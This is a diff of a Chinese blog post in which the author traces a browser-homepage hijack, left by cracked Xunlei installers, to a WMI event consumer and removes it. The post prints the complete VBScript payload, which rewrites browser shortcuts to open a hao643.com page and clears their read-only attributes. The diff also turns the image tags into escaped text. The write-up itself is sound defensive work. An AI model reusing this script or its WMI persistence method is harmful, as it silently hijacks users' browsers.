@@ -43,20 +43,20 @@
   <section class="article-entry">
     <p>这周装了几个号称破解版的迅雷，虽然全部卸载了，但是打开浏览器的时候，突然发现，所有浏览器的首页全部被hao123给劫持了。第一反应是，完了，中木马了。但是用了一段时间发现，貌似只是浏览器首页被hao123劫持，并没有出现别的异常。</p>
 <p>网上搜索了一下，chrome主页被篡改，找到了原因。原来，所有的浏览器快捷方式后缀都被加上了hao123的主页地址，通过这么一个简单的修改，就能达到劫持主页的效果，果然简单粗暴。</p>
-<p><img src="/img/2018042207.png" width="670px"></p>
+<p>&lt;img src=&quot;/img/2018042207.png&quot; width=&quot;670px&quot;/&gt;</p>
 <p>我用Everything，搜索出了所有的浏览器快捷方式，一一修改之后，再次打开浏览器，一切回归正常。正当我以为没什么问题了之后，隔了一段时间再次打开浏览器时，突然发现，浏览器主页又再次变回了hao123，查看快捷方式一看，果不其然，之前修改了的快捷方式又被加上了hao123的后缀。</p>
 <p>我的第一反应是，有进程在定时运行脚步，修改快捷方式。我先是打开了计划任务，查看有没有异常的任务在运行，并没有。然后我又查找了任务管理器的后台进程，也没啥异常的，最后又看了一下服务也没有发现有异常的。没办法只能网上再去找找解决办法，别说还真的有解答。</p>
 <p>网上很多人都说有一个叫scrcons.exe的进程会自启动，修改快速启动栏命令，然后自动关闭，难怪我在任务管理器后台进程里找不到。那么这个scrcons.exe进程又是由谁来发起的呢？带着这个疑问我们不妨先安装一个<a href="https://www.microsoft.com/en-us/download/details.aspx?id=7684" target="_blank" rel="external">WMI Tools</a>，然后<strong>用管理员身份</strong>打开WMI Event Viewer工具。切记用管理员身份打开，不然后面删除操作可能会报删不掉的警告。</p>
-<p><img src="/img/2018042202.png" width="670px"></p>
+<p>&lt;img src=&quot;/img/2018042202.png&quot; width=&quot;670px&quot;/&gt;</p>
 <p>默认打开路径为<code>root\CIMV2</code>，反正我打开就这个路径，不用输入用户名和密码，直接点OK。</p>
-<p><img src="/img/2018042203.png" width="670px"></p>
-<p><img src="/img/2018042204.png" width="670px"></p>
+<p>&lt;img src=&quot;/img/2018042203.png&quot; width=&quot;670px&quot;/&gt;</p>
+<p>&lt;img src=&quot;/img/2018042204.png&quot; width=&quot;670px&quot;/&gt;</p>
 <p>我们会找到一段VBScript，右键单击，选择view instant properties。</p>
-<p><img src="/img/2018042205.png" width="670px"></p>
-<p><img src="/img/2018042206.png" width="670px"></p>
+<p>&lt;img src=&quot;/img/2018042205.png&quot; width=&quot;670px&quot;/&gt;</p>
+<p>&lt;img src=&quot;/img/2018042206.png&quot; width=&quot;670px&quot;/&gt;</p>
 <p>ScriptText的内容如下</p>
 <blockquote>
-<p>On Error Resume Next:Const link = “<a href="http://hao643.com/?r=ggggg&amp;m=d15&quot;:Const" target="_blank" rel="external">http://hao643.com/?r=ggggg&amp;m=d15&quot;:Const</a> link360 = “<a href="http://hao643.com/?r=ggggg&amp;m=d15&amp;&gt;" target="_blank" rel="external">http://hao643.com/?r=ggggg&amp;m=d15&amp;&gt;</a> s=3”:browsers = “114ie.exe,115chrome.exe,1616browser.exe,2345chrome.exe,2345explorer.exe,360se.exe,360chrome.exe,avant.&gt; exe,baidubrowser.exe,chgreenbrowser.exe,chrome.exe,firefox.exe,greenbrowser.exe,iexplore.exe,juzi.exe,kbrowser.exe,launcher.&gt; exe,liebao.exe,maxthon.exe,niuniubrowser.exe,qqbrowser.exe,sogouexplorer.exe,srie.exe,tango3.exe,theworld.exe,tiantian.&gt; exe,twchrome.exe,ucbrowser.exe,webgamegt.exe,xbrowser.exe,xttbrowser.exe,yidian.exe,yyexplorer.exe”:lnkpaths = &gt; “C:\Users\Public\Desktop,C:\ProgramData\Microsoft\Windows\Start &gt; Menu\Programs,C:\Users\Administrator\Desktop,C:\Users\Administrator\AppData\Roaming\Microsoft\Internet Explorer\Quick &gt; Launch,C:\Users\Administrator\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User &gt; Pinned\StartMenu,C:\Users\Administrator\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User &gt; Pinned\TaskBar,C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs”:browsersArr = split(browsers,”,”)&gt; :Set oDic = CreateObject(“scripting.dictionary”):For Each browser In browsersArr:oDic.Add LCase(browser), &gt; browser:Next:lnkpathsArr = split(lnkpaths,”,”):Set oFolders = CreateObject(“scripting.dictionary”):For Each lnkpath In &gt; lnkpathsArr:oFolders.Add lnkpath, lnkpath:Next:Set fso = CreateObject(“Scripting.Filesystemobject”):Set WshShell = CreateObject&gt; (“Wscript.Shell”):For Each oFolder In oFolders:If fso.FolderExists(oFolder) Then:For Each file In fso.GetFolder(oFolder).&gt; Files:If LCase(fso.GetExtensionName(file.Path)) = “lnk” Then:Set oShellLink = WshShell.CreateShortcut(file.Path):path = &gt; oShellLink.TargetPath:name = fso.GetBaseName(path) &amp; “.” &amp; fso.GetExtensionName(path):If oDic.Exists(LCase(name)) Then:If LCase&gt; (name) = LCase(“360se.exe”) Then:oShellLink.Arguments = link360:Else:oShellLink.Arguments = link:End If:If file.Attributes And &gt; 1 Then:file.Attributes = file.Attributes - 1:End If:oShellLink.Save:End If:End If:Next:End If:Next:</p>
+<p>On Error Resume Next:Const link = &quot;http://hao643.com/?r=ggggg&amp;m=d15&quot;:Const link360 = &quot;http://hao643.com/?r=ggggg&amp;m=d15&amp;&gt; s=3&quot;:browsers = &quot;114ie.exe,115chrome.exe,1616browser.exe,2345chrome.exe,2345explorer.exe,360se.exe,360chrome.exe,avant.&gt; exe,baidubrowser.exe,chgreenbrowser.exe,chrome.exe,firefox.exe,greenbrowser.exe,iexplore.exe,juzi.exe,kbrowser.exe,launcher.&gt; exe,liebao.exe,maxthon.exe,niuniubrowser.exe,qqbrowser.exe,sogouexplorer.exe,srie.exe,tango3.exe,theworld.exe,tiantian.&gt; exe,twchrome.exe,ucbrowser.exe,webgamegt.exe,xbrowser.exe,xttbrowser.exe,yidian.exe,yyexplorer.exe&quot;:lnkpaths = &gt; &quot;C:\Users\Public\Desktop,C:\ProgramData\Microsoft\Windows\Start &gt; Menu\Programs,C:\Users\Administrator\Desktop,C:\Users\Administrator\AppData\Roaming\Microsoft\Internet Explorer\Quick &gt; Launch,C:\Users\Administrator\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User &gt; Pinned\StartMenu,C:\Users\Administrator\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User &gt; Pinned\TaskBar,C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs&quot;:browsersArr = split(browsers,&quot;,&quot;)&gt; :Set oDic = CreateObject(&quot;scripting.dictionary&quot;):For Each browser In browsersArr:oDic.Add LCase(browser), &gt; browser:Next:lnkpathsArr = split(lnkpaths,&quot;,&quot;):Set oFolders = CreateObject(&quot;scripting.dictionary&quot;):For Each lnkpath In &gt; lnkpathsArr:oFolders.Add lnkpath, lnkpath:Next:Set fso = CreateObject(&quot;Scripting.Filesystemobject&quot;):Set WshShell = CreateObject&gt; (&quot;Wscript.Shell&quot;):For Each oFolder In oFolders:If fso.FolderExists(oFolder) Then:For Each file In fso.GetFolder(oFolder).&gt; Files:If LCase(fso.GetExtensionName(file.Path)) = &quot;lnk&quot; Then:Set oShellLink = WshShell.CreateShortcut(file.Path):path = &gt; oShellLink.TargetPath:name = fso.GetBaseName(path) &amp; &quot;.&quot; &amp; fso.GetExtensionName(path):If oDic.Exists(LCase(name)) Then:If LCase&gt; (name) = LCase(&quot;360se.exe&quot;) Then:oShellLink.Arguments = link360:Else:oShellLink.Arguments = link:End If:If file.Attributes And &gt; 1 Then:file.Attributes = file.Attributes - 1:End If:oShellLink.Save:End If:End If:Next:End If:Next:</p>
 </blockquote>
 <p>明眼人都看得出这段脚本的意思，原来这个脚本是由WMI发起的定时自动运行脚本。对于WMI的解释，我是没看懂，维基百科上的解释是这样子的</p>
 <blockquote>
@@ -65,7 +65,7 @@
 </blockquote>
 <p>自定义的脚本运行时，由WMI发起，由系统自带的scrcons.exe作为脚本宿主进行解析，而scrcons.exe是由系统以 SYSTEM权限启动的，也就是说，我们的脚本是以SYSTEM权限执行，并且其所创建的任意进程都会继承SYSTEM权限。所以，这也解释了为什么会定时出现scrcons.exe进程的原因。</p>
 <p>既然找到了源头，就应该斩草除根，删掉这段脚本，最后再将快捷方式的后缀删除就大功告成了。</p>
-<p><img src="/img/2018042208.png" width="670px"></p>
+<p>&lt;img src=&quot;/img/2018042208.png&quot; width=&quot;670px&quot;/&gt;</p>
 
   </section>
 </article>
